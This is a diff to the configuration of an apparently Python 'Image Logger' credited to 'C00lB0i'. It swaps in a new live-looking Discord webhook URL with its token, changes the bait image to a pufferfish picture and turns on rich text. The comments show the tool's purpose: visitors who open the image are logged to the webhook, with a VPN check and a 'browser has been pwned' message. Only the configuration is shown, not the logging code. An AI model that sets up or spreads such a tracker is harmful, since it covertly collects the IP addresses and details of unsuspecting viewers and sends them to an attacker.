@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441762501766418492/VmB-NEKJrGyQyWNdENb5MBS_UflXqHQrt2N_aFHRs8-YCtDYKzPfeNEjwvvyR-7NX4BM",
-    "image": "https://cdn.discordapp.com/attachments/1325413239424815185/1327432541434548306/togif.gif?ex=692253e4&is=69210264&hm=890290999d91271c43b858353d6d78950a775e25a92e351e7b5c80003b64a821", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1441927395870507109/PK0xSBDY4nuZ5ESrL9qm2R00_156N2JwsZgf1ojDgxCblmQqExsWI0clNIu1hNgSFfnb",
+    "image": "https://facts.net/wp-content/uploads/2023/07/pufferfish-cute-.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
-        "richMessage": false, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://cdn.discordapp.com/attachments/1325413239424815185/1327432541434548306/togif.gif?ex=692253e4&is=69210264&hm=890290999d91271c43b858353d6d78950a775e25a92e351e7b5c80003b64a821" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
